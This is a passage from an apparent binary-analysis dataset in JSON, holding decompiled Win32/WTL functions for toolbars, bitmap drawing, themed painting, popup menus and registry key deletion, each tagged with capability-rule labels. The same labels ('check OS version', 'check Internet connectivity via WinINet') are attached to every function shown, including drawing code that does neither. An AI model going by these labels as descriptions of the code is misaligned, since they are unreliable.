(*_sym.imp.KERNEL32.dll_FindResourceW)(*0x6cc7e4, arg_ch & 0xffff, 0xf1);\n    pcVar3 = _sym.imp.KERNEL32.dll_LoadResource;\n    if (((iVar7 != 0) &&\n        (iVar7 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar14, iVar7),  pcVar2 = _sym.imp.KERNEL32.dll_LockResource, \n        iVar7 != 0)) && (iVar7 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar7),  var_278h = iVar7,  iVar7 != 0)) {\n        var_264h = NULL;\n        var_26ch = arg_10h != 0;\n        iVar10 = *(iVar7 + 6) + var_26ch;\n        uVar14 = iVar10 * 0x14;\n        if (uVar14 < 0x201) {\n            var_264h = &var_260h;\n        }\n        else {\n            fcn.00402b50(uVar14);\n        }\n        puVar5 = var_264h;\n        if (var_264h != NULL) {\n            if (arg_10h != 0) {\n                *var_264h = 4;\n                var_264h[1] = 0;\n                *(var_264h + 2) = 0x100;\n                var_264h[3] = 0;\n                var_264h[4] = 0;\n            }\n            iVar11 = 0;\n            var_274h = 0;\n            if (*(iVar7 + 6) != 0) {\n                iVar13 = var_26ch * 0x14;\n                do {\n                    if (*(iVar7 + 8 + iVar11 * 2) == 0) {\n                        *(iVar13 + var_264h) = 8;\n                        uVar6 = 1;\n                        uVar14 = 0;\n                    }\n                    else {\n                        *(iVar13 + var_264h) = var_274h;\n                        var_274h = var_274h + 1;\n                        uVar14 = *(iVar7 + 8 + iVar11 * 2);\n                        uVar6 = 0x400;\n                    }\n                    *(iVar13 + 4 + var_264h) = uVar14;\n                    iVar11 = iVar11 + 1;\n                    *(iVar13 + 8 + var_264h) = uVar6 >> 8;\n                    *(iVar13 + 9 + var_264h) = uVar6;\n                    *(iVar13 + 0xc + var_264h) = 0;\n                    *(iVar13 + 0x10 + var_264h) = 0;\n                    iVar13 = iVar13 + 0x14;\n                } while (iVar11 < *(iVar7 + 6));\n            }\n            iVar7 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                              (0, L\"ToolbarWindow32\", 0, arg_14h, 0, 0, 100, 100, arg_8h, var_268h, *0x6cc7e0, 0);\n            pcVar4 = _sym.imp.USER32.dll_SendMessageW;\n            if (iVar7 != 0) {\n                (*_sym.imp.USER32.dll_SendMessageW)(iVar7, 0x41e, 0x14, 0);\n                iVar11 = (*pcVar4)(iVar7, 0x31, 0, 0);\n                if (iVar11 == 0) {\n                    iVar11 = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n                }\n                fcn.00431db0(&lpvObject, 0, 0x5c);\n                (*_sym.imp.GDI32.dll_GetObjectW)(iVar11, 0x5c, &lpvObject);\n                uVar14 = *0x6cc7e4;\n                var_26ch = (lpvObject ^ lpvObject >> 0x1f) - (lpvObject >> 0x1f) & 0xffff;\n                var_268h = var_26ch;\n                uVar8 = (*pcVar1)(*0x6cc7e4, var_270h & 0xffff, 2);\n                uVar8 = (*pcVar3)(uVar14, uVar8);\n                iVar11 = (*pcVar2)(uVar8);\n                if (*(iVar11 + 0xe) < 5) {\n                    var_280h = var_27ch;\n                    var_27ch = var_270h;\n                    puVar9 = &var_280h;\n                    uVar8 = 0x413;\n                    iVar11 = var_274h;\n                }\n                else {\n                    uVar8 = 0xffffffff;\n                    if (*(iVar11 + 0xe) != 0x20) {\n                        uVar8 = 0xff000000;\n                    }\n                    puVar9 = (*_sym.imp.COMCTL32.dll_ImageList_LoadImageW)\n                                       (*0x6cc7e4, var_270h & 0xffff, *(var_278h + 2), 1, uVar8, 0, 0x2040);\n                    uVar8 = 0x430;\n                    iVar11 = 0;\n                }\n                pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n                (*_sym.imp.USER32.dll_SendMessageW)(iVar7, uVar8, iVar11, puVar9);\n                (*pcVar1)(iVar7, 0x444, iVar10, puVar5);\n                iVar10 = var_278h;\n                uVar14 = *(var_278h + 4);\n                if (*(var_278h + 4) <= var_26ch) {\n                    uVar14 = var_268h & 0xffff;\n                }\n                (*pcVar1)(iVar7, 0x420, 0, uVar14 << 0x10 | *(var_278h + 2));\n                uVar12 = *(iVar10 + 4);\n                if (uVar12 <= var_26ch) {\n                    uVar12 = var_268h;\n                }\n                (*pcVar1)(iVar7, 0x41f, 0, CONCAT22(uVar12 + 7, *(iVar10 + 2) + 7));\n            }\n        }\n        if (var_264h != &var_260h) {\n            fcn.00405ca0();\n        }\n        fcn.004303e9(unaff_EDI);\n        return;\n    }\n    fcn.004303e9(unaff_EDI);\n    return;\n}\n",
        "token_count": 1866
    },
    "00403cf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403cf0(uint lpSubKey)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX[2];\n    if (piVar1 != NULL) {\n        uVar4 = *in_ECX;\n        if (*piVar1 == 0) {\n            if (piVar1[1] != 0) {\n                uVar4 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(uVar4, lpSubKey);\n                return uVar4;\n            }\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"Advapi32.dll\");\n            if ((iVar2 != 0) &&\n               (pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"RegDeleteKeyTransactedW\"),  pcVar3 != NULL)) {\n                uVar4 = (*pcVar3)(uVar4, lpSubKey, 0, 0, *piVar1, 0);\n                return uVar4;\n            }\n        }\n        return 1;\n    }\n    if (*0x6cc6ec == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"Advapi32.dll\");\n        if (iVar2 == 0) {\n            *0x6cc6ec = '\\x01';\n        }\n        else {\n            *0x6cc6e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"RegDeleteKeyExW\");\n            *0x6cc6ec = '\\x01';\n        }\n    }\n    if (*0x6cc6e8 == NULL) {\n        uVar4 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(*in_ECX, lpSubKey);\n        return uVar4;\n    }\n    uVar4 = (**0x6cc6e8)(*in_ECX, lpSubKey, in_ECX[1], 0);\n    return uVar4;\n}\n",
        "token_count": 470
    },
    "004040f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_78h\n\nvoid __cdecl\nfcn.004040f0(int32_t nXDest, int32_t nYDest, int32_t nWidth, int32_t nHeight, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint arg_24h, int32_t arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_ECX;\n    code *pcVar6;\n    uint arg_8h;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint hgdiobj;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint *var_4ch;\n    int32_t hdcDest;\n    int32_t lprc;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint pbmi;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_50h = arg_1ch;\n    var_64h = arg_28h;\n    var_68h = arg_2ch;\n    var_6ch = arg_30h;\n    var_4ch = in_ECX;\n    if (arg_18h == 0) {\n        var_54h = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*in_ECX);\n        if (var_54h == 0) goto code_r0x0040415a;\n    }\n    else {\n        var_54h = arg_18h;\n    }\n    iVar2 = var_54h;\n    iVar3 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*in_ECX);\n    if (iVar3 != 0) {\n        var_30h = nWidth;\n        var_2ch = nHeight;\n        arg_8h = 0;\n        pbmi = 0x28;\n        var_28h = 0x10001;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = 0;\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0xffffff;\n        var_74h = (*_sym.imp.GDI32.dll_CreateDIBSection)(iVar3, &pbmi, 0, &var_78h, 0, 0);\n        pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n        pcVar6 = _sym.imp.GDI32.dll_DeleteDC;\n        if (var_74h == 0) {\n            if (arg_18h == 0) {\n                (*_sym.imp.GDI32.dll_DeleteDC)(iVar2);\n            }\n        }\n        else {\n            var_70h = (*_sym.imp.GDI32.dll_SelectObject)(iVar3, var_74h);\n            var_5ch = 0;\n            if (var_50h != 0) {\n                var_5ch = (*pcVar1)(iVar2, var_50h);\n            }\n            iVar4 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*var_4ch);\n            hdcDest = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*var_4ch);\n            var_50h = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(iVar2, nWidth, nHeight);\n            var_58h = (*_sym.imp.GDI32.dll_CreateBitmap)(nWidth, nHeight, 1, 1, 0);\n            pcVar6 = _sym.imp.GDI32.dll_SelectObject;\n            hgdiobj = (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_50h);\n            uVar5 = (*pcVar6)(hdcDest, var_58h);\n            (*_sym.imp.GDI32.dll_BitBlt)(iVar4, 0, 0, nWidth, nHeight, var_54h, arg_20h, arg_24h, 0xcc0020);\n            (*_sym.imp.GDI32.dll_SetBkColor)(iVar4, 0x808080);\n            (*_sym.imp.GDI32.dll_BitBlt)(hdcDest, 0, 0, nWidth, nHeight, iVar4, 0, 0, 0xcc0020);\n            (*_sym.imp.GDI32.dll_BitBlt)(iVar4, 0, 0, nWidth, nHeight, hdcDest, 0, 0, 0x660046);\n            (*_sym.imp.GDI32.dll_BitBlt)(iVar3, 0, 0, nWidth, nHeight, iVar4, 0, 0, 0xcc0020);\n            (*_sym.imp.GDI32.dll_SelectObject)(iVar4, hgdiobj);\n            (*_sym.imp.GDI32.dll_SelectObject)(hdcDest, uVar5);\n            if (var_58h != 0) {\n                (*_sym.imp.GDI32.dll_DeleteObject)(var_58h);\n            }\n            if (var_50h != 0) {\n                (*_sym.imp.GDI32.dll_DeleteObject)(var_50h);\n            }\n            pcVar6 = _sym.imp.GDI32.dll_DeleteDC;\n            if (hdcDest != 0) {\n                (*_sym.imp.GDI32.dll_DeleteDC)(hdcDest);\n            }\n            if (iVar4 != 0) {\n                (*pcVar6)(iVar4);\n            }\n            if (var_64h != 0) {\n                var_3ch = nWidth + nXDest;\n                var_38h = nHeight + nYDest;\n                lprc = nXDest;\n                var_40h = nYDest;\n                (*_sym.imp.USER32.dll_FillRect)(*var_4ch, &lprc, var_64h);\n            }\n            uVar5 = (*_sym.imp.GDI32.dll_SelectObject)(*var_4ch, var_68h);\n            (*_sym.imp.GDI32.dll_BitBlt)(*var_4ch, nXDest + 1, nYDest + 1, nWidth, nHeight, iVar3, 0, 0, 0xb8074a);\n            (*_sym.imp.GDI32.dll_SelectObject)(*var_4ch, var_6ch);\n            (*_sym.imp.GDI32.dll_BitBlt)(*var_4ch, nXDest, nYDest, nWidth, nHeight, iVar3, 0, 0, 0xb8074a);\n            pcVar6 = _sym.imp.GDI32.dll_SelectObject;\n            (*_sym.imp.GDI32.dll_SelectObject)(*var_4ch, uVar5);\n            (*pcVar6)(iVar3, var_70h);\n            iVar2 = var_54h;\n            (*pcVar6)(var_54h, var_5ch);\n            pcVar6 = _sym.imp.GDI32.dll_DeleteDC;\n            if (arg_18h == 0) {\n                (*_sym.imp.GDI32.dll_DeleteDC)(iVar2);\n            }\n            (*_sym.imp.GDI32.dll_DeleteObject)(var_74h);\n        }\n        (*pcVar6)(iVar3);\n        fcn.004303e9(arg_8h);\n        return;\n    }\n    if (arg_18h == 0) {\n        (*_sym.imp.GDI32.dll_DeleteDC)(iVar2);\n    }\ncode_r0x0040415a:\n    fcn.004303e9(var_78h);\n    return;\n}\n",
        "token_count": 1866
    },
    "00404420": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404420(uint hdc, uint arg_ch)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t in_ECX;\n    int32_t *piVar9;\n    uint *arg_8h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t lpRect;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t lprc;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar5 = in_ECX + -0x1c;\n    if (in_ECX == 0) {\n        piVar5 = 0x4;\n    }\n    var_28h = in_ECX;\n    (*_sym.imp.USER32.dll_GetClientRect)(*piVar5, &lpRect);\n    lprc = *(in_ECX + 0x24) + lpRect;\n    var_10h = *(in_ECX + 0x2c) + var_20h;\n    var_ch = var_1ch - *(in_ECX + 0x28);\n    var_8h = var_18h - *(in_ECX + 0x30);\n    var_2ch = 0;\n    cVar4 = fcn.00406560();\n    if (((cVar4 == '\\0') || (iVar6 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&var_2ch),  iVar6 < 0)) ||\n       (var_2ch == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    pcVar3 = _sym.imp.GDI32.dll_ExtTextOutW;\n    pcVar2 = _sym.imp.GDI32.dll_SetBkColor;\n    if (bVar1) {\n        var_2ch = (*_sym.imp.GDI32.dll_SetBkColor)(hdc, 0);\n        iVar6 = var_28h;\n        if (var_2ch != -1) {\n            (*pcVar3)(hdc, 0, 0, 2, &lpRect, 0, 0, 0);\n            (*pcVar2)(hdc, var_2ch);\n            iVar6 = var_28h;\n        }\n    }\n    else {\n        piVar9 = in_ECX + 0x18;\n        if (*piVar9 == 0) {\n            uVar8 = (*_sym.imp.USER32.dll_GetSysColor)(0x1e);\n            iVar7 = (*pcVar2)(hdc, uVar8);\n            iVar6 = var_28h;\n            if (iVar7 != -1) {\n                (*pcVar3)(hdc, 0, 0, 2, &lpRect, 0, 0, 0);\n                (*pcVar2)(hdc, iVar7);\n                iVar6 = var_28h;\n            }\n        }\n        else {\n            iVar7 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar6 = var_28h;\n            if (var_28h == 0) {\n                piVar9 = 0x38;\n            }\n            (*_sym.imp.UxTheme.dll_DrawThemeBackground)(*piVar9, hdc, 9, (*piVar5 != iVar7) + '\\x01', &lpRect, arg_ch);\n        }\n    }\n    piVar5 = in_ECX + 0x18;\n    if (*(iVar6 + 0x24) == -1) {\n        arg_8h = &lprc;\n        (*_sym.imp.USER32.dll_SetRectEmpty)();\n    }\n    else {\n        arg_8h = 0x5;\n        uVar8 = (*_sym.imp.USER32.dll_GetSysColor)();\n        iVar6 = (*pcVar2)(hdc, uVar8);\n        if (iVar6 != -1) {\n            (*_sym.imp.GDI32.dll_ExtTextOutW)(hdc, 0, 0, 2, &lprc, 0, 0, 0);\n            (*pcVar2)(hdc, iVar6);\n        }\n    }\n    iVar6 = (*_sym.imp.USER32.dll_IsRectEmpty)(&lprc);\n    if (iVar6 == 0) {\n        if (var_28h == 0) {\n            piVar5 = 0x38;\n        }\n        if (*piVar5 != 0) {\n            uVar8 = 1;\n            (*_sym.imp.UxTheme.dll_DrawThemeBackground)(*piVar5, hdc, 0x1d, 1, &lprc, arg_ch);\n            fcn.004303e9(uVar8);\n            return;\n        }\n        uVar8 = (*_sym.imp.USER32.dll_GetSysColor)(0xf);\n        iVar6 = (*pcVar2)(hdc, uVar8);\n        if (iVar6 != -1) {\n            (*_sym.imp.GDI32.dll_ExtTextOutW)(hdc, 0, 0, 2, &lprc, 0, 0, 0);\n            (*pcVar2)(hdc, iVar6);\n        }\n    }\n    fcn.004303e9(arg_8h);\n    return;\n}\n",
        "token_count": 1267
    },
    "00404640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404640(uint arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    int32_t in_ECX;\n    code *pcVar7;\n    uint in_stack_ffffff3c;\n    uint var_70h;\n    uint var_6ch;\n    uint var_3ch;\n    int32_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t lprc;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_28h = arg_ch;\n    var_30h = in_ECX + -0x30;\n    if (in_ECX == 0) {\n        var_30h = 0x4;\n    }\n    (*_sym.imp.USER32.dll_GetClientRect)(*var_30h, &lpRect);\n    lprc = *(in_ECX + 0x24) + lpRect;\n    var_20h = *(in_ECX + 0x2c) + var_10h;\n    var_1ch = var_ch - *(in_ECX + 0x28);\n    var_18h = var_8h - *(in_ECX + 0x30);\n    var_2ch = 0;\n    cVar3 = fcn.00406560();\n    if (cVar3 == '\\0') {\ncode_r0x004046c6:\n        bVar1 = false;\n    }\n    else {\n        iVar4 = (*_sym.imp.dwmapi.dll_DwmIsCompositionEnabled)(&var_2ch);\n        if ((iVar4 < 0) || (var_2ch == 0)) goto code_r0x004046c6;\n        bVar1 = true;\n    }\n    pcVar7 = _sym.imp.GDI32.dll_ExtTextOutW;\n    pcVar2 = _sym.imp.GDI32.dll_SetBkColor;\n    if (bVar1) {\n        var_2ch = (*_sym.imp.GDI32.dll_SetBkColor)(arg_8h, 0);\n        if (var_2ch == -1) goto code_r0x0040477a;\n        (*pcVar7)(arg_8h, 0, 0, 2, &lpRect, 0, 0, 0);\n        iVar4 = var_2ch;\n    }\n    else {\n        if (*(in_ECX + 0x18) != 0) {\n            iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n            puVar6 = in_ECX + 0x18;\n            if (in_ECX == 0) {\n                puVar6 = 0x4c;\n            }\n            (*_sym.imp.UxTheme.dll_DrawThemeBackground)\n                      (*puVar6, arg_8h, 9, (*var_30h != iVar4) + '\\x01', &lpRect, var_28h);\n            pcVar7 = _sym.imp.GDI32.dll_ExtTextOutW;\n            goto code_r0x0040477a;\n        }\n        uVar5 = (*_sym.imp.USER32.dll_GetSysColor)(0x1e);\n        var_28h = (*pcVar2)(arg_8h, uVar5);\n        if (var_28h == -1) goto code_r0x0040477a;\n        (*pcVar7)(arg_8h, 0, 0, 2, &lpRect, 0, 0, 0);\n        iVar4 = var_28h;\n    }\n    (*pcVar2)(arg_8h, iVar4);\ncode_r0x0040477a:\n    if (*(in_ECX + 0x24) == -1) {\n        (*_sym.imp.USER32.dll_SetRectEmpty)(&lprc);\n    }\n    else {\n        uVar5 = (*_sym.imp.USER32.dll_GetSysColor)(5);\n        var_28h = (*pcVar2)(arg_8h, uVar5);\n        if (var_28h != -1) {\n            (*pcVar7)(arg_8h, 0, 0, 2, &lprc, 0, 0, 0);\n            in_stack_ffffff3c = arg_8h;\n            (*pcVar2)(arg_8h, var_28h);\n        }\n    }\n    pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n    var_10h = var_18h;\n    puVar6 = in_ECX + 0x138;\n    if (in_ECX == 0) {\n        puVar6 = 0x16c;\n    }\n    var_28h = (*_sym.imp.GDI32.dll_SelectObject)(arg_8h, *puVar6);\n    var_70h = 0x40;\n    fcn.00431db0(&var_6ch, 0, 0x3c);\n    var_6ch = 0x2800;\n    var_3ch = 0x14;\n    if (in_ECX == 0) {\n        in_ECX = 0x34;\n    }\n    if (*(in_ECX + 0x18) == 0) {\n        (*_sym.imp.USER32.dll_DrawTextW)(arg_8h, 0x47be00, 0xffffffff, &lpRect, 0x825);\n    }\n    else {\n        cVar3 = fcn.00406560();\n        if (cVar3 == '\\0') {\n            in_stack_ffffff3c = arg_8h;\n            (*_sym.imp.UxTheme.dll_DrawThemeText)\n                      (*(in_ECX + 0x18), arg_8h, 3, 0, 0x47be00, 0xffffffff, 0x825, 0, &lpRect);\n        }\n        else {\n            in_stack_ffffff3c = arg_8h;\n            (*_sym.imp.UxTheme.dll_DrawThemeTextEx)\n                      (*(in_ECX + 0x18), arg_8h, 3, 0, 0x47be00, 0xffffffff, 0x825, &lpRect, &var_70h);\n        }\n    }\n    (*pcVar2)(arg_8h, var_28h);\n    fcn.004303e9(in_stack_ffffff3c);\n    return;\n}\n",
        "token_count": 1512
    },
    "004048a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004048a0(uint wParam, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uFlags;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_64h;\n    uint var_54h;\n    uint pt;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint lParam;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    _lParam = ZEXT816(0);\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x41d, wParam, &lParam);\n    pcVar1 = _sym.imp.USER32.dll_MapWindowPoints;\n    var_48h = lParam;\n    var_44h = var_8h;\n    (*_sym.imp.USER32.dll_MapWindowPoints)(*(in_ECX + 4), 0, &var_48h, 1);\n    (*pcVar1)(*(in_ECX + 4), 0, &lParam, 2);\n    var_3ch = 0x14;\n    var_38h = lParam;\n    uStack56 = uStack20;\n    uStack52 = uStack16;\n    uStack48 = var_8h;\n    uVar3 = (*_sym.imp.USER32.dll_GetSubMenu)(*(in_ECX + 0x44), wParam);\n    var_18h = 0;\n    _var_28h = ZEXT816(0);\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x417, wParam, &var_28h);\n    *(in_ECX + 0x88) = wParam;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    var_40h = var_24h;\n    (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x403, var_24h, 1);\n    (*pcVar1)(*(in_ECX + 4), 0x448, var_40h, 0);\n    uFlags = 0x4040;\n    if (arg_ch != '\\0') {\n        uFlags = 0x1040;\n    }\n    fcn.00404b30(uVar3, uFlags, var_48h, var_44h, &var_3ch);\n    (*pcVar1)(*(in_ECX + 4), 0x403, var_40h, 0);\n    iVar5 = *(in_ECX + 4);\n    iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n    if (iVar4 != iVar5) {\n        (*pcVar1)(iVar5, 0x448, 0xffffffff, 0);\n    }\n    pcVar2 = _sym.imp.USER32.dll_PeekMessageW;\n    uVar3 = 0x201;\n    *(in_ECX + 0x88) = 0xffffffff;\n    _var_64h = ZEXT816(0);\n    var_4ch = 0;\n    _var_54h = 0;\n    iVar5 = (*pcVar2)(&var_64h, *(in_ECX + 4), 0x201, 0x201, 0);\n    if (iVar5 != 0) {\n        iVar5 = (*_sym.imp.USER32.dll_PtInRect)(&lParam, pt, var_4ch);\n        if (iVar5 != 0) {\n            (*pcVar2)(&var_64h, *(in_ECX + 4), 0x201, 0x201, 1);\n        }\n    }\n    if (*(in_ECX + 0x8c) != -1) {\n        if (*0x6cc7cc == 0) {\n            iVar5 = *0x6cc6dc + 0x10;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar5);\n            if (*0x6cc7cc == 0) {\n                *0x6cc7cc = (*_sym.imp.USER32.dll_RegisterWindowMessageW)(L\"WTL_CmdBar_InternalAutoPopupMsg\");\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar5);\n        }\n        pcVar1 = _sym.imp.USER32.dll_PostMessageW;\n        uVar3 = 0;\n        (*_sym.imp.USER32.dll_PostMessageW)(*(in_ECX + 4), *0x6cc7cc, *(in_ECX + 0x8c));\n        if (((*(in_ECX + 0x8c) & 0xffff0000) == 0) && ((*(in_ECX + 0x84) & 8) == 0)) {\n            (*pcVar1)(*(in_ECX + 4), 0x100, 0x28, 0);\n        }\n        *(in_ECX + 0x8c) = 0xffffffff;\n        fcn.004303e9(uVar3);\n        return;\n    }\n    *(in_ECX + 0x84) = *(in_ECX + 0x84) & 0xef;\n    if ((*(in_ECX + 0x84) & 0x20) == 0) {\n        if ((*(in_ECX + 0x85) & 6) == 6) {\n            *(in_ECX + 0x85) = *(in_ECX + 0x85) & 0xf7;\n        }\n        fcn.004064e0();\n        fcn.004303e9(uVar3);\n        return;\n    }\n    (*pcVar1)(*(in_ECX + 4), 0x448, var_40h, 0);\n    uVar3 = 0;\n    (*pcVar1)(*(in_ECX + 4), 0x449, 1);\n    fcn.004303e9(uVar3);\n    return;\n}\n",
        "token_count": 1435
    },
    "00404b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404b30(uint hMenu, uint uFlags, uint arg_10h, uint arg_14h, uint lptpm)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t in_ECX;\n    uint lpmii;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint uIDNewItem;\n    uint var_38h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t lpBuffer;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n    uVar3 = *0x6cc7e0;\n    *0x6cc7bc = -(in_ECX != 0) & in_ECX + 4U;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *0x6cc7b8 = (*_sym.imp.USER32.dll_SetWindowsHookExW)(5, fcn.00403850, uVar3, uVar2);\n    uVar3 = *(in_ECX + 4);\n    *(in_ECX + 0x84) = *(in_ECX + 0x84) & 0xf7 | 1;\n    uVar2 = fcn.0040edc0(arg_10h, arg_14h);\n    uVar3 = (*_sym.imp.USER32.dll_TrackPopupMenuEx)(hMenu, uFlags, uVar2, arg_14h, uVar3, lptpm);\n    *(in_ECX + 0x84) = *(in_ECX + 0x84) & 0xfe;\n    (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*0x6cc7b8);\n    *0x6cc7b8 = 0;\n    *0x6cc7bc = 0;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n    (*_sym.imp.USER32.dll_UpdateWindow)(*(in_ECX + 4));\n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    iVar6 = *(in_ECX + 4);\n    iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar6);\n    while (iVar4 != 0) {\n        iVar5 = (*pcVar1)(iVar4);\n        iVar6 = iVar4;\n        iVar4 = iVar5;\n    }\n    (*_sym.imp.USER32.dll_UpdateWindow)(iVar6);\n    if ((*(in_ECX + 0x84) & 4) != 0) {\n        while( true ) {\n            iVar6 = *(in_ECX + 0x18) + -1;\n            if (((iVar6 < 0) || (iVar4 = *(*(in_ECX + 0x14) + iVar6 * 4),  *(in_ECX + 0x18) <= iVar6)) ||\n               (*(var_4h + 0x18) = iVar6,  iVar4 == 0)) break;\n            iVar5 = 0;\n            iVar6 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar4);\n            in_ECX = var_4h;\n            if (0 < iVar6) {\n                do {\n                    lpmii = 0x30;\n                   